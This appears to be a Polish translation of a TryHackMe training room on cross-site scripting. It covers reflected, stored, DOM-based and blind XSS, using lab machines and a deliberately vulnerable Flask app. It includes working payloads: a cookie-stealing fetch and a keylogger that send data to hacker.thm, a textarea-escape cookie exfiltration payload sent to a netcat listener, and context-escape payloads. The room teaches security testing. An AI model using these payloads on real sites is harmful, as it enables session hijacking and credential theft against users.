---

Aplikacje internetowe obsługują większość przepływów pracy w firmach, a **Cross-Site Scripting (XSS)** pozostaje jedną z najłatwiejszych dróg ataku dla użytkowników. Ostatnie incydenty pokazują, że XSS jest wykorzystywany do kradzieży sesji, dostarczania złośliwego oprogramowania i eskalacji ataków w sieci. W tym pokoju skupimy się na rzeczywistych XSS; w jaki sposób atakujący przekształca podatne dane wejściowe w działającą lukę w zabezpieczeniach oraz praktyczne środki zaradcze, które programiści mogą zastosować w celu ograniczenia ryzyka.

## Scenariusz

_Firma poprosiła Cię o przeprowadzenie testu penetracyjnego swojej wewnętrznej aplikacji internetowej. Aplikacja zawiera sekcję komentarzy publicznych, panel użytkownika oraz opcję wyszukiwania wiadomości._

Niezbędne jest natychmiastowe przeprowadzenie testu penetracyjnego w celu zidentyfikowania wszelkich luk w zabezpieczeniach i zapobieżenia wyciekowi danych lub dalszym uszkodzeniom.

## Cele edukacyjne

W tej sali poznasz następujące koncepcje:

- Zrozumieć powszechnie stosowaną terminologię związaną z XSS
- Identyfikuj i klasyfikuj XSS typy: odbite, przechowywane i DOM
- Jak wykorzystać XSS podatności
- Techniki łagodzenia XSS podatności

## Wymagania wstępne

Oczekujemy, że przed rozpoczęciem korzystania z pokoju będziesz w pełni rozumieć następujące koncepcje:

- Zrozumienie adresów IP, portów i protokołów ( sala [„Koncepcje sieciowe ”)](https://tryhackme.com/room/networkingconcepts)
- Znajomość administrowania systemem Windows, w tym rejestrów zdarzeń isystem plikówstruktura. ( [Podstawy systemu Windows, pokój 1](https://tryhackme.com/r/room/windowsfundamentals1xbx) )
- Podstawy cyberbezpieczeństwa: podstawowa wiedza na temat złośliwego oprogramowania,phishingi typowe wektory ataku ([PhishingPodstawy](https://tryhackme.com/room/phishingbasics) i[PhishingPokój e-mailowy](https://tryhackme.com/r/room/phishingemails2rytmuv) )

W tym zadaniu omówimy podstawowe terminy, które musisz zrozumieć, aby opanować XSS.

- **Model Obiektowy Dokumentu (DOM)** : Model Obiektowy Dokumentu (DOM) to żywa, ustrukturyzowana reprezentacja strony internetowej w przeglądarce, w zasadzie drzewo elementów (tagów, tekstu, atrybutów), które JavaScript może odczytywać i zmieniać. Można to sobie wyobrazić jako zapisany w pamięci schemat strony; gdy JavaScript aktualizuje DOM, widoczna strona aktualizuje się natychmiast.

![Transformacja kodu na Cookie w DOM.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1775464533519.png)

- **Parametry URL** : Parametry URL (ciągi zapytań) to bity znajdujące się po `?`adresie URL, które przekazują dane do witryny, na przykład `https://site.com/search?q=hello`zawierają `q`parametr o wartości  `hello`. Są one kontrolowane przez użytkownika (wpisywane w pasku adresu lub wysyłane za pomocą linków/formularzy), dlatego należy traktować ich wartości jako niewiarygodne dane wejściowe.
- **JavaScript** : język skryptowy działający w przeglądarce. Ładunki XSS to zazwyczaj małe fragmenty kodu JavaScript, które działają w kontekście strony ofiary i mogą odczytywać lub modyfikować DOM, wysyłać żądania sieciowe lub uzyskiwać dostęp do plików cookie (chyba że są chronione).
- **Pliki cookie** : Pliki cookie przechowują niewielkie fragmenty danych w przeglądarce (identyfikatory sesji, preferencje). Jeśli plik cookie jest odczytywalny przez JavaScript, a atakujący może uruchomić JavaScript za pomocą XSS, może go ukraść i przejąć kontrolę nad sesją. `HttpOnly`to flaga uniemożliwiająca JavaScript odczytanie pliku cookie (dobrze).
- **Ucieczka** : Ucieczka (kodowanie danych wyjściowych) oznacza transformację danych użytkownika tak, aby przeglądarka traktowała je jako zwykły tekst, a nie kod, na przykład poprzez zamianę `<`na `&lt`; `<script>`, stając się w ten sposób nieszkodliwym tekstem. Filtr (walidacja danych wejściowych) sprawdza, czy dane wejściowe wyglądają na dozwolone (litery, cyfry, długość), ale nie zapobiega przekształcaniu danych w kod po ich późniejszym umieszczeniu na stronie. Na przykład surowe dane wejściowe użytkownika  `<script>alert(1)</script>` zostaną ucieczkowane, ponieważ HTML stanie się `&lt;script&gt;alert(1)&lt;/script&gt`.

## Co to jest XSS Ładunek?

W kontekście XSS, ładunek to kod JavaScript, który atakujący wstrzykuje do aplikacji internetowej działającej w przeglądarce innego użytkownika.

Gdy podatna na ataki witryna akceptuje dane wprowadzane przez użytkownika i wyświetla je bez odpowiedniego filtrowania, przeglądarka może zinterpretować wstrzyknięty kod jako część strony internetowej. W takim przypadku JavaScript jest wykonywany w przeglądarce ofiary tak samo, jak prawidłowy kod na stronie.

![Sekwencja wykonania ataku XSS.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1775464615917.png)

JakiśXSSładunek zwykle składa się z dwóch części:

**Zamiar**

Właśnie tego atakujący oczekuje od kodu. Przykładami mogą być: wyświetlanie dowodu koncepcji, kradzież plików cookie sesji, rejestrowanie naciśnięć klawiszy lub wykonywanie działań w imieniu użytkownika.

**Modyfikacja**

Każda aplikacja internetowa obsługuje dane wejściowe inaczej. Z tego powodu atakujący często muszą modyfikować ładunek, aby poprawnie wykonywał się w określonym miejscu na stronie. Na przykład, ładunek może wymagać ucieczki z tagu HTML, atrybutu lub bloku JavaScript przed wykonaniem.

W praktyce pentesterzy rzadko używają tego samego ładunku dla wszystkich celów. Zamiast tego dostosowują go w zależności od tego, jak dane wejściowe są odzwierciedlane na stronie.

## Testowanie dla XSS

Podczas testowania XSS Pentesterzy zwykle zaczynają od prostego ładunku, aby potwierdzić, czy JavaScript może zostać wykonany.

Typowym ładunkiem testowym jest:

```python
<script>alert('XSS')</script>
```

Jeśli aplikacja jest podatna na atak, przeglądarka wykona wstrzyknięty skrypt i wyświetli komunikat. Potwierdza to, że JavaScript może działać w przeglądarce ofiary.

Po potwierdzeniu tej informacji tester może zastąpić ładunek testowy czymś bardziej przydatnym.

## Gdzie wstrzykiwane są ładunki

XSS ładunki są zwykle wstrzykiwane w obszary witryny internetowej, które akceptują i wyświetlają dane wprowadzane przez użytkownika. 

- Pola wyszukiwania
- Sekcje komentarzy
- Nazwy profili
- Formularze opinii
- Parametry adresu URL

Na przykład, jeśli strona wyszukiwania odzwierciedla dane wprowadzone przez użytkownika w adresie URL:

```python
https://site.thm/search?q=hello
```

A aplikacja wyświetla:

```python
You searched for: hello
```

Zamiast tego atakujący może podać:

```python
<script>alert(1)</script>
```

Jeśli dane wejściowe nie zostaną oczyszczone, przeglądarka wykona wstrzyknięty kod JavaScript.

## Przykłady intencji XSS

**Dowód koncepcji**

To najprostszy ładunek. Jego celem jest jedynie zademonstrowanie, że atak XSS jest możliwy na stronie internetowej.

```python
<script>alert('XSS')</script>
```

Testerzy bezpieczeństwa często wykorzystują ten ładunek w trakcie testów, aby potwierdzić, że JavaScript może zostać wykonany.

**Kradzież sesji**

Aplikacje internetowe często przechowują identyfikatory sesji w plikach cookie przeglądarki. Jeśli atakujący uzyska dostęp do tych plików cookie, może podszyć się pod użytkownika.

Poniższy ładunek wysyła pliki cookie ofiary na serwer kontrolowany przez atakującego:

```python
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

Funkcja `btoa()`koduje wartość pliku cookie w celu zapewnienia bezpiecznej transmisji.

**Rejestrator klawiszy**

Keylogger rejestruje wszystko, co użytkownik wpisuje na stronie. Może przechwytywać nazwy użytkowników, hasła lub dane kart kredytowych.

```python
<script>
document.onkeypress = function(e) {
fetch('https://hacker.thm/log?key=' + btoa(e.key));
}
</script>
```

Informacja o każdym naciśnięciu klawisza przez ofiarę jest wysyłana na serwer atakującego.

**Ataki na logikę biznesową**

Niektóre ładunki mają na celu realizację określonych funkcji w aplikacji. Wyobraźmy sobie na przykład funkcję JavaScript, `user.changeEmail()`która zmienia adres e-mail użytkownika.

Atakujący może nadużyć tej funkcji, wykorzystując ładunek taki jak:

```python
<script>user.changeEmail('attacker@hacker.thm');</script>
```

Jeśli atak się powiedzie, atakujący może zresetować hasło ofiary i przejąć jej konto.

Następne cztery zadania będą eksplorować różne typyXSSluk, z których każda wymaga nieco innego ładunku i poziomu interakcji użytkownika.

Przechodząc dalej, przejdziemy przez typy XSS, zaczynając od **odbicia XSS**.

Odbite XSS Występuje, gdy aplikacja internetowa pobiera dane wprowadzone przez użytkownika (takie jak ciąg zapytania, pole formularza lub nagłówek) i natychmiast wyświetla je na stronie bez ich oczyszczania. Atakujący tworzy złośliwy link lub formularz zawierający kod JavaScript i przekonuje ofiarę do kliknięcia; ponieważ witryna „odzwierciedla” dane wprowadzone przez atakującego, przeglądarka uruchamia wstrzyknięty skrypt w źródle witryny. Typowymi wyzwalaczami są pola wyszukiwania, komunikaty o błędach lub dowolna strona, która odwołuje się do parametrów z adresu URL lub `POST`treści.

![Odbity cykl przepływu XSS.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1775465022991.png)Gdy wstrzyknięty skrypt zostanie uruchomiony w przeglądarce ofiary, może odczytać lub zmodyfikować stronę, wykraść pliki cookie lub tokeny sesji (chyba że te pliki cookie są `HttpOnly`), wykonywać działania w imieniu użytkownika lub ładować inną złośliwą zawartość. Podstawową przyczyną jest generowanie niezaufanych danych w postaci kodu, zamiast uciekania z niego w odpowiednim kontekście.

## Praktyczny

W części praktycznej rozważ poniższy fragment kodu.

_app.py (Atlas News)_

```python

from flask import Flask, request, render_template, redirect
from markupsafe import escape
from datetime import datetime

app = Flask(__name__)

# helper for template footer (year)
@app.context_processor
def inject_now():
    return {"now": lambda: datetime.utcnow().year}

NEWS = [
    {"title": "Product launch: SecureMail", "summary": "A privacy-focused email client arrives."},
    {"title": "Weekly Roundup", "summary": "Top vulnerabilities and patches this week."},
    {"title": "Research: XSS Trends 2025", "summary": "A short summary of XSS cases observed in the wild."},
]

COMMENTS = []

@app.route("/")
def home():

    q = request.args.get("q", "")
    query_escaped = escape(q) 
    return render_template("news.html", news=NEWS, query=q, query_escaped=query_escaped)

@app.route("/guestbook", methods=["GET", "POST"])
def guestbook():

    if request.method == "POST":
        name = request.form.get("name", "Anonymous")
        comment = request.form.get("comment", "")
        
        COMMENTS.append({"name": escape(name), "comment": comment})
        return redirect("/guestbook")

    return render_template("guestbook.html", comments=COMMENTS)

@app.route("/dom")
def dom_preview():

    return render_template("dom_preview.html")

if __name__ == "__main__":
    # bind to all interfaces for lab convenience (change to 127.0.0.1 for local-only)
    app.run(debug=True, host="0.0.0.0", port=5000)
```

Użyj przeglądarki Mozilla Firefox w AttackBox, aby przejść do `http://MACHINE_IP:5000`witryny. Jeśli łączysz się przez VPN, otwórz przeglądarkę i wejdź na stronę laboratorium `http://MACHINE_IP:5000/`. Powinna wyświetlić się strona AtlasNews z polem wyszukiwania u góry.

![Panel Atlas News.](https://tryhackme-images.s3.amazonaws.com/user-uploads/63ef2b1fa956ab3e540ee70e/room-content/63ef2b1fa956ab3e540ee70e-1760867948269.png)

W polu wyszukiwania wklej proste słowo testowe, np. „produkt”, a następnie kliknij **Szukaj** , aby wyświetlić wyniki, jak pokazano poniżej:

![Opcja wyszukiwania w panelu Atlas News.](https://tryhackme-images.s3.amazonaws.com/user-uploads/63ef2b1fa956ab3e540ee70e/room-content/63ef2b1fa956ab3e540ee70e-1760869295783.png)

Teraz, jako pentesterzy, zagłębimy się w temat i wkleimy interesujący kod, taki jak `<script>alert('Hack')</script>`. Jeśli strona jest podatna na ataki, w przeglądarce pojawi się wyskakujące okienko z ostrzeżeniem, a wstrzyknięta treść pojawi się w obszarze wyników wyszukiwania. 

![Udany atak XSS na panel Atlas News.](https://tryhackme-images.s3.amazonaws.com/user-uploads/63ef2b1fa956ab3e540ee70e/room-content/63ef2b1fa956ab3e540ee70e-1760869785043.png)

Jest to odbity atak XSS: aplikacja odczytuje `q`parametr zapytania z adresu URL i natychmiast renderuje go z powrotem na stronie, dzięki czemu kontrolowana przez atakującego wartość w adresie URL zostaje wykonana w przeglądarce ofiary.

## Przyczyna główna

W `app.py`aplikacji internetowej, obiekt obsługujący przekazuje surowy parametr do szablonu:

```python
return render_template("news.html", news=NEWS, query=q, query_escaped=query_escaped)
```

Pochodzi `q`z `q = request.args.get("q", ""))`, które jest źródłem danych niepewnych.

**Przechowywane XSS**dzieje się, gdy aplikacja zapisuje **kontrolowane przez atakującego dane wejściowe na serwerze** (zazwyczaj w bazie danych), a następnie udostępnia tę zawartość innym użytkownikom bez odpowiedniego użycia kodu ucieczki, co powoduje uruchomienie wstrzykniętego skryptu w przeglądarce każdego użytkownika odwiedzającego witrynę.

Przechowywane XSS ma większy wpływ niż odzwierciedlenie XSS Ponieważ ładunek utrzymuje się i może z czasem wpływać na wielu użytkowników (administratorów, odwiedzających witrynę). Atakujący może umieścić skrypt w komentarzu, opisie profilu, wiadomości lub panelu administracyjnym; za każdym razem, gdy ktokolwiek (w tym administratorzy) wyświetli tę stronę, przeglądarka wykona wstrzyknięty kod JavaScript w kontekście podatnego źródła. Ten skrypt może kraść tokeny sesji i wykonywać działania w imieniu użytkownika. Przechowywane XSS jest powszechnie spotykany w sekcjach komentarzy, profilach użytkowników, tablicach ogłoszeń, recenzjach produktów i funkcjach przesyłania plików, które generują metadane.

## ![Zapisany cykl przepływu XSS.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1775465193229.png)Praktyczny

Przejdź do strony Księgi Gości na `http://MACHINE_IP:5000/guestbook`. W formularzu komentarza wklej prosty test `<script>alert('You are Hacked')</script>`i kliknij **„Prześlij”** . Komentarze zostaną zapisane i będą widoczne również dla innych użytkowników.

![Funkcja księgi gości umożliwiająca użytkownikom dodawanie komentarzy.](https://tryhackme-images.s3.amazonaws.com/user-uploads/63ef2b1fa956ab3e540ee70e/room-content/63ef2b1fa956ab3e540ee70e-1760871944411.png)

Odśwież stronę. Jeśli strona jest podatna na ataki, zobaczysz wyskakujące okienko z ostrzeżeniem. Ładunek jest nadal aktywny, więc każdy nowy użytkownik strony komentarzy go uruchomi.

![Udany atak XSS przy użyciu funkcji księgi gości i wyświetlenie wyskakującego okienka.](https://tryhackme-images.s3.amazonaws.com/user-uploads/63ef2b1fa956ab3e540ee70e/room-content/63ef2b1fa956ab3e540ee70e-1760871756223.png)

## Przyczyna główna

Aplikacja bezpośrednio renderowała dane wejściowe kontrolowane przez atakującego jako surowy kod HTML ( `{{ query|safe }} and {{ c.comment|safe }}`) lub zapisywała surowe komentarze, a następnie renderowała je bez użycia kodu ucieczki. Pozwalało to na `<script>`wykonywanie wstrzykniętego kodu (lub innego kodu HTML) w przeglądarkach użytkowników. Stało się tak, ponieważ kod ominął automatyczne użycie kodu ucieczki i traktował niezaufane dane wejściowe jako bezpieczne.

Oparty na DOM XSS Występuje, gdy JavaScript po stronie klienta odczytuje dane kontrolowane przez atakującego z DOM ( `URL`, `location.hash`, `location.search`, `document.referrer`, `localStorage`, itd.) i zapisuje je z powrotem na stronie w niebezpieczny sposób (np `innerHTML`. , `document.write`, `eval`). Ładunek nigdy nie musi trafiać na serwer; sam DOM przeglądarki staje się powierzchnią ataku, a wstrzyknięty skrypt uruchamia się natychmiast w źródle strony.

## ![Cykl przepływu DOM XSS.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1775465280160.png)Praktyczny

Przejdź do strony **Podglądu Wiadomości** na `http://MACHINE_IP:5000/dom`.

![strona z podglądem wiadomości na DOM.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1773573159862.png)

Wklej tekst w formularzu **podglądu ręcznego** strony `<img src=x onerror="alert('Hacked you again')">`. Kliknij **„Podgląd”** , a zobaczysz następujące okno:

![Udany atak XSS z wykorzystaniem opcji podglądu DOM.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1777455284666.png)

## Przyczyna główna

Skrypt po stronie klienta odczytał kontrolowane przez atakującego dane (fragment) i zapisał je bezpośrednio na stronie za pomocą `innerHTML`, dzięki czemu przeglądarka przeanalizowała i wykonała wstrzyknięty  `<img onerror=...>`ładunek. Kod zaufał niezaufanym danym wejściowym i użył niebezpiecznego ujścia ( `innerHTML`) zamiast potraktować wartość jako tekst lub ją oczyścić. Dane wejściowe nie dotarły do ​​serwera, więc zabezpieczenia po stronie serwera nie pomagają.

**Ślepy XSS**jest podobny do przechowywanego XSS(omówiliśmy w Zadaniu 5) w tym sensie, że Twój ładunek zostaje zapisany na stronie internetowej, aby mógł go obejrzeć inny użytkownik, ale w tym przypadku nie możesz zobaczyć, jak ładunek działa, ani najpierw przetestować go samodzielnie.

Strona internetowa zawiera formularz kontaktowy, za pomocą którego można wysłać wiadomość do pracownika. Treść wiadomości nie jest sprawdzana pod kątem złośliwego kodu, co pozwala atakującemu na wprowadzenie dowolnych informacji. Wiadomości te są następnie przekształcane w zgłoszenia do pomocy technicznej, które pracownicy przeglądają na prywatnym portalu internetowym.

![Ślepy cykl przepływu XSS.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1775465452282.png)Używając odpowiedniego ładunku, kod JavaScript atakującego może wywołać stronę internetową atakującego, ujawniając adres URL portalu dla pracowników, pliki cookie pracownika, a nawet zawartość przeglądanej strony portalu. W ten sposób atakujący może potencjalnie przejąć sesję pracownika i uzyskać dostęp do prywatnego portalu.

## Jak sprawdzić, czy nie ma ślepej próby XSS

Podczas testowania w trybie ślepym XSS podatności, upewnij się, że Twój ładunek zawiera wywołanie zwrotne (zwykle HTTP(żądanie). W ten sposób wiesz, czy i kiedy Twój kod jest wykonywany.

Popularne narzędzie dla niewidomych XSSataki to[XSSHunter Express(otwiera się w nowej karcie)](https://github.com/mandatoryprogrammer/xsshunter-express)Chociaż możliwe jest stworzenie własnego narzędzia w JavaScript, to narzędzie będzie automatycznie przechwytywać pliki cookie, adresy URL, zawartość stron i inne dane.

## Praktyczny

Przejdź do witryny Acme IT Support pod adresem `http://MACHINE_IP:8080`. Następnie kliknij zakładkę **Klienci** na górnym pasku nawigacyjnym i kliknij link **„Zarejestruj się tutaj”** , aby utworzyć konto. Po skonfigurowaniu konta zaloguj się i kliknij zakładkę **Zgłoszenia pomocy technicznej** , gdzie sprawdzimy, czy nie ma luk w zabezpieczeniach.

![Strona docelowa panelu klienta Acme IT Support.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1773652442133.png)

Spróbuj utworzyć zgłoszenie do pomocy technicznej, klikając zielony przycisk **„Utwórz zgłoszenie”** , wpisz słowo „ **test** ” w polu „ **Temat zgłoszenia”** i **„Zawartość zgłoszenia”** , a następnie kliknij niebieski przycisk **„Utwórz zgłoszenie”** . Zobaczysz teraz swoje nowe zgłoszenie na liście z `ID`numerem, który możesz kliknąć, aby je otworzyć. 

![Strona z biletami pomocy technicznej Acme IT.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1773652555521.png)

Podobnie jak w zadaniu 4, zbadamy, jak wcześniej wprowadzony tekst jest odzwierciedlany na stronie. Po przejrzeniu kodu źródłowego strony zauważymy, że tekst jest umieszczany wewnątrz znacznika `textarea`.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/23721628b263e7d6fd00097904bc6847.png)

![Opcje przeglądania innych biletów znajdują się na liście rozwijanej.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/34e69ee3fce3021fee02a13a680d5d47.png)

Wróćmy teraz i utwórzmy kolejne zgłoszenie. Sprawdźmy, czy możemy uniknąć znacznika textarea, wprowadzając następujący ładunek do tematu zgłoszenia:

```shell-session
</textarea>test
```

Ponownie otwierając zgłoszenie i wyświetlając kod źródłowy strony, udało nam się uniknąć znacznika `textarea`.

![Udane wyjście w kodzie źródłowym HTML.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/e247f6dd0b2ebe0e4e512b16b41cec05.png)

![Informacje o bilecie po wyjściu ze znacznika textarea.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/0ad04cf010b889a8adfdba9d24bcb826.png)

Rozwińmy teraz ten ładunek, aby sprawdzić, czy możemy uruchomić JavaScript i potwierdzić, że funkcja tworzenia zgłoszeń jest podatna na atak XSS. Wypróbuj kolejny nowy bilet z następującym ładunkiem:

```shell-session
</textarea><script>alert('THM');</script>
```

Teraz, gdy przeglądasz bilet, powinieneś zobaczyć okno z ostrzeżeniem zawierające ciąg znaków „THMTeraz rozszerzymy ładunek jeszcze bardziej i zwiększymy wpływ luk w zabezpieczeniach. Ponieważ ta funkcja generuje zgłoszenie do pomocy technicznej, możemy zasadnie oczekiwać, że pracownik go przejrzy i wykona kod JavaScript. 

**Wyodrębnianie plików cookie**

Przydatną informacją, którą można uzyskać od innego użytkownika, są jego **pliki cookie** , które moglibyśmy wykorzystać do podniesienia naszych uprawnień poprzez przejęcie jego sesji logowania. Aby to zrobić, nasz ładunek będzie musiał wyodrębnić plik cookie użytkownika i przesłać go na inny, wybrany przez nas serwer WWW. Najpierw musimy skonfigurować serwer nasłuchujący, który będzie odbierał te informacje.

Używając AttackBoxa, skonfigurujmy serwer nasłuchujący za pomocą Netcata. Jeśli chcemy nasłuchiwać na porcie `9001`, możemy uruchomić polecenie `nc -nlvp 9001`. `-l`Opcja wskazuje, że chcemy używać Netcata w trybie nasłuchiwania, podczas gdy `-p`opcja służy do określenia numeru portu. `-n`Opcja ta unika rozwiązywania nazw hostów przez DNS i `-v`uruchamia Netcata w trybie szczegółowym.

nie

```shell-session
user@machine$ nc -nlvp 9001
Listening on [0.0.0.0] (family 0, port 9001)
```

Teraz, gdy skonfigurowaliśmy metodę odbioru wykradzionych informacji, możemy utworzyć ładunek.

```shell-session
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```

Rozłóżmy ładunek na czynniki pierwsze:

- Tag  `</textarea>` zamyka pole obszaru tekstowego.
- Tag  `<script>`otwiera nam obszar do pisania kodu JavaScript.
- Polecenie  `fetch()` wysyła żądanie HTTP.
- `URL_OR_IP` jest to albo adres URL programu THM Request Catch, Twój adres IP z THM AttackBox lub Twój adres IP w sieci THM VPN.
- `PORT_NUMBER`jest numerem portu, którego używasz do nasłuchiwania połączeń w AttackBox.
- `?cookie=` jest ciągiem zapytania zawierającym pliki cookie ofiary.
- `btoa()` Polecenie base64 koduje pliki cookie ofiary.
- `document.cookie` uzyskuje dostęp do plików cookie ofiary witryny wsparcia technicznego Acme IT.
- `</script>` zamyka blok kodu JavaScript.

Teraz utwórz kolejny bilet, używając powyższego ładunku w polu **„Temat biletu”** , pamiętając o zastąpieniu  `URL_OR_IP:PORT_NUMBER`zmiennych swoimi ustawieniami (pamiętaj również o podaniu numeru portu dla programu nasłuchującego Netcat). Poczekaj minutę, a zobaczysz żądanie zawierające pliki cookie ofiary.

**Uwaga: Mogą wystąpić problemy z otrzymaniem żądania za pomocą własnego konta.Maszyna wirtualnaiVPNZaleca się użycie AttackBox do tego zadania.**

Teraz możesz dekodować te informacje przy użyciu kodu Base64, korzystając ze strony takiej jak [https://www.base64decode.org/(otwiera się w nowej karcie)](https://www.base64decode.org/).

Ładunek to kod JavaScript, który chcemy wykonać w przeglądarce innego użytkownika lub jako dowód koncepcji w celu zademonstrowania luki w zabezpieczeniach witryny internetowej.

Twój ładunek może mieć wiele zastosowań: od prostego wyświetlania pola z ostrzeżeniem JavaScript w celu udowodnienia, że ​​możemy wykonać JavaScript na docelowej stronie internetowej, po wyodrębnianie informacji ze strony internetowej lub sesji użytkownika.

To, w jaki sposób Twój ładunek JavaScript zostanie odzwierciedlony w kodzie witryny docelowej, określi, jakiego ładunku potrzebujesz. Aby to przećwiczyć, wejdź na stronę internetową pod adresem https://LAB_WEB_URL.p.thmlabs.com `http://MACHINE_IP`lub skorzystaj z [adresu https://LAB_WEB_URL.p.thmlabs.com(otwiera się w nowej karcie)](https://lab_web_url.p.thmlabs.com/), co spowoduje wyświetlenie następującej strony:

![ekran powitalny pokazujący poziom 1.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1773647908971.png)

Celem każdego poziomu będzie wykonanie funkcji alertu JavaScript z ciągiem „THM”, na przykład:

```shell-session
<script>alert('THM');</script>
```

## Poziom pierwszy

Wyświetli się formularz, w którym należy wpisać swoje imię i nazwisko. Po wpisaniu imienia i nazwiska zostanie ono wyświetlone w poniższym wierszu, na przykład:

![formularz z prośbą o podanie imienia.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/1606a13f7fe891c779fe50ea0302afb8.png)

Jeśli wyświetlisz **kod źródłowy strony** , zobaczysz swoje imię i nazwisko odzwierciedlone w kodzie:

![nazwa odzwierciedlona w źródle strony.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f371398ba148e07e85b946028e7f6919.png)

Zamiast wpisywać swoje imię, spróbujemy wpisać następujący kod JavaScript:

```shell-session
<script>alert('THM');</script>
```

Teraz po kliknięciu przycisku **Enter** pojawi się okno z ostrzeżeniem zawierające ciąg znaków „THM", a kod źródłowy strony będzie wyglądał następująco:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/49444bf865cdc230d9855b53d93745c6.png)

Następnie otrzymasz komunikat potwierdzający, że ładunek został pomyślnie wysłany, a także link do następnego poziomu.

## Poziom drugi

Podobnie jak na poprzednim poziomie, zostaniesz poproszony o ponowne podanie swojego imienia. Tym razem po kliknięciu **Enter** Twoje imię zostanie wyświetlone w `input`tagu:

![Opcja poziomu 2 na stronie.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/5458bd5bb617b7e00d9aad9579c030b9.png)

Przeglądając kod źródłowy strony, możesz zobaczyć swoje imię odzwierciedlone wewnątrz atrybutu wartości znacznika `input`:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png)

Nie zadziałałoby to, gdybyś spróbował poprzedniego ładunku JavaScript, ponieważ nie można go uruchomić z poziomu `input`tagu. Zamiast tego musimy `input`najpierw uciec z tagu, aby ładunek mógł działać poprawnie. Możesz to zrobić za pomocą następującego ładunku:

```shell-session
"><script>alert('THM');</script>
```

Ważną częścią ładunku jest ta, `">`która zamyka `value`parametr, a następnie zamyka `input`znacznik.

Spowoduje to prawidłowe zamknięcie znacznika wejściowego i umożliwi uruchomienie ładunku JavaScript:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/21a6597c0964f08c69ebffbf014a886a.png)

Teraz, po kliknięciu przycisku **Enter** , pojawi się okno z alertem z ciągiem znaków „THM”. Następnie pojawi się komunikat potwierdzający pomyślne załadowanie danych wraz z linkiem do następnego poziomu.

## Poziom trzeci

Wyświetli się kolejny formularz, w którym zostaniesz poproszony o podanie swojego imienia. Tak jak na poprzednim poziomie, Twoje imię zostanie wyświetlone w znaczniku HTML, tym razem `textarea`.

![Poziom 3: prośba o podanie pełnego imienia i nazwiska.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/48abb43c885cb5bafff22c714e79b53a.png)

Będziemy musieli uciec z tego `textarea`tagu nieco inaczej niż `input`w przypadku Poziomu Drugiego, używając następującego ładunku:

```shell-session
</textarea><script>alert('THM');</script>
```

To zmienia to:

![Poziom 2 – zobacz źródło.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/c3d0d38d23fab0608bc3ca8b9441974c.png)

Do tego:

![Poziom 2 Wyświetl źródło zaktualizowanej treści.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/77ce8ffc9465731ab834f02292ec86d1.png)

Ważną częścią powyższego ładunku jest `</textarea>`, który zamyka element textarea i umożliwia uruchomienie skryptu.

Teraz po kliknięciu przycisku **Enter** pojawi się okno z ostrzeżeniem zawierające ciąg znaków „THM”, a następnie komunikat potwierdzający, że ładunek został pomyślnie przesłany, a także link do następnego poziomu.

## Poziom czwarty 

Podanie imienia i nazwiska w formularzu spowoduje jego wyświetlenie na stronie. Ten poziom wygląda podobnie do poziomu pierwszego, ale po sprawdzeniu kodu źródłowego strony zobaczysz, że Twoje imię i nazwisko jest widoczne w kodzie JavaScript.

![Opcja inner.HTML poziomu czwartego.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/80fd5abe95b63ce52ff0ff9f9f6f6d57.png)

Musisz uciec z istniejącego polecenia JavaScript, aby móc uruchomić kod; możesz to zrobić za pomocą poniższego kodu `';alert('THM');//`  , który zobaczysz na zrzucie ekranu poniżej. Zamyka `'`pole określające nazwę, a następnie `;`oznacza koniec bieżącego polecenia, a  `//`na końcu sprawia, że ​​wszystko po nim staje się komentarzem, a nie kodem wykonywalnym.

![Opcja inner.HTML poziomu czwartego po ataku XSS.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/17c6b9717f16af910557438017be9c53.png)

